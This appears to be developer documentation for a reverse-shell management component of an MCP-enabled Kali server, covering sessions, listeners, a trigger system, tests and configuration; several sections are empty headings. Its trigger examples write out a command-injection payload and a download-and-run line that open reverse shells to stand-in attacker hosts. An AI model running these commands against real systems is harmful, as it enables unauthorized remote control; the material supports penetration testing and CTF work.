# Reverse Shell Manager Documentation

The Reverse Shell Manager is a core component of the MCP Kali Server that provides comprehensive reverse shell session management capabilities. This document explains the architecture, functionality, and usage patterns of the system.

## 🏗️ Architecture Overview

The Reverse Shell Manager follows a multi-layered architecture designed for scalability, security, and ease of use:


**Architecture Notes:**
- **MCP Clients**: Connect through the dedicated MCP Server (`mcp-server/mcp_server.py`) which acts as a protocol translator, converting MCP calls to HTTP requests
- **Direct API Clients**: Can connect directly to the REST API endpoints without going through the MCP layer
- **Both paths**: Eventually reach the same Reverse Shell Manager core functionality through the API routes

## 📡 MCP Integration

All reverse shell functionality is fully available through the Model Context Protocol (MCP) interface. The MCP server provides seamless access to all operations:

### Available MCP Tools


## 🔄 Session Lifecycle Management

The Reverse Shell Manager handles complete session lifecycles from creation to termination:


## 🛠️ Core Components

### 1. Session Management

Each reverse shell session is managed as an independent entity with the following attributes:


### 2. Listener Types

The system supports two main listener implementations:


## 🚀 Trigger System (New Feature)

The trigger system allows non-blocking execution of commands that establish reverse shell connections:


### Trigger Command Examples

```bash
# Web-based trigger (common in CTFs and pentesting)
curl -X POST http://target.com/vulnerable.php \
  -d "command=nc attacker_ip 4444 -e /bin/bash"

# File-based trigger
wget http://attacker.com/reverse_shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh

# Direct command execution
ssh user@target.com "nc attacker_ip 4444 -e /bin/bash"
```

## 🔧 API Endpoints

The REST API provides comprehensive access to all reverse shell functionality:


## 💾 Data Flow Patterns

### Command Execution Flow


### File Transfer Flow


## 🔒 Security Considerations

### Process Isolation


### Session Cleanup and Resource Management


## 🧪 Testing and Validation

### Test Architecture

The reverse shell manager includes comprehensive testing using Docker containers:

```mermaid
flowchart TB
    subgraph "Test Environment"
        subgraph "Docker Container"
            SSH[SSH Server<br/>Port 2222]
            WEB[Web Server<br/>Port 8080]
            TOOLS[Testing Tools<br/>nc, bash, curl]
        end
        
        subgraph "Kali Server"
            RSM[Reverse Shell Manager]
            TESTS[Test Suite]
        end
    end
    
    subgraph "Test Scenarios"
        T1[Listener Creation]
        T2[Command Execution]
        T3[File Transfer]
        T4[🆕 Trigger Actions]
        T5[Session Cleanup]
        T6[Error Handling]
    end
    
    TESTS --> T1
    TESTS --> T2
    TESTS --> T3
    TESTS --> T4
    TESTS --> T5
    TESTS --> T6
    
    T1 --> RSM
    T2 --> RSM
    T3 --> RSM
    T4 --> RSM
    T5 --> RSM
    T6 --> RSM
    
    RSM <--> SSH
    RSM <--> WEB
    RSM <--> TOOLS
    
    style T4 fill:#e8f5e8
    style RSM fill:#e1f5fe
```



### Key Test Cases

1. **Non-blocking Trigger Test**: Validates that trigger actions return immediately (< 3 seconds)
2. **Session Isolation**: Ensures sessions don't interfere with each other
3. **Resource Cleanup**: Verifies proper cleanup of processes, threads, and file descriptors
4. **Error Recovery**: Tests handling of network failures, timeouts, and process crashes
5. **Concurrent Operations**: Validates multiple simultaneous sessions and operations


## 🔧 Configuration Options

### Session Configuration

```python
REVERSE_SHELL_CONFIG = {
    "default_listener_type": "pwncat",
    "default_port_range": (4444, 4500),
    "command_timeout": 30,
    "connection_timeout": 60,
    "max_sessions": 10,
    "cleanup_interval": 300,
    "log_commands": True,
    "auto_restart": False
}
```

### Listener Type Configuration

```python
LISTENER_CONFIGS = {
    "netcat": {
        "command": "nc -nvlp {port}",
        "connection_indicator": "Connection received"
    },
    "pwncat": {
        "command": ["pwncat -l {port}", "pwncat --listen {port}"],
        "fallback_to_netcat": True,
        "connection_indicator": "received connection"
    }
}
```

**Note**: The system only supports two listener types:
- **netcat** (`nc`): Standard netcat listener
- **pwncat**: Uses pwncat binary (not pwncat-cs), with automatic fallback to netcat if pwncat is not available

## 🚨 Troubleshooting Guide

### Common Issues and Solutions

```mermaid
flowchart TD
    subgraph "Common Issues"
        I1[Server Blocking on Trigger]
        I2[Connection Refused]
        I3[Command Timeouts]
        I4[Session Not Found]
        I5[File Transfer Failures]
    end
    
    subgraph "Solutions"
        S1[✅ Use send_payload API<br/>Non-blocking execution]
        S2[Check listener status<br/>Verify port availability]
        S3[Increase timeout values<br/>Check command validity]
        S4[Verify session ID<br/>Check session list]
        S5[Check file permissions<br/>Verify file encoding]
    end
    
    I1 --> S1
    I2 --> S2
    I3 --> S3
    I4 --> S4
    I5 --> S5
    
    style S1 fill:#e8f5e8
    style I1 fill:#ffebee
```



### Debug Commands

```bash
# Check session status
curl http://localhost:5000/api/reverse-shell/sessions

# Get detailed session info
curl http://localhost:5000/api/reverse-shell/{session_id}/status

# Test listener connectivity
nc -zv localhost {port}

# Monitor system resources
ps aux | grep python
netstat -tlnp | grep {port}
```

## 🔮 Future Enhancements

### Planned Features


### Roadmap

1. **Phase 1**: Enhanced error handling and retry logic
2. **Phase 2**: Session persistence and recovery mechanisms
3. **Phase 3**: Advanced payload generation and encoding
4. **Phase 4**: Real-time monitoring and analytics dashboard
5. **Phase 5**: Integration with additional penetration testing frameworks

---

## 📚 Related Documentation

- [STREAMING.md](STREAMING.md) - File transfer and streaming operations
- [TOOLS_SUMMARY.md](TOOLS_SUMMARY.md) - Overview of all available tools
- [README.md](../README.md) - Main project documentation
- [ARCHITECTURE.md](../ARCHITECTURE.md) - Overall system architecture

## 🤝 Contributing

When contributing to the Reverse Shell Manager:

1. **Follow Security Best Practices**: Always validate input and handle errors gracefully
2. **Add Comprehensive Tests**: Include both unit tests and integration tests
3. **Update Documentation**: Keep this document and code comments current
4. **Consider Performance**: Monitor resource usage and optimize where possible
5. **Maintain Compatibility**: Ensure changes don't break existing API contracts

For detailed contributing guidelines, see the main [README.md](../README.md) file.
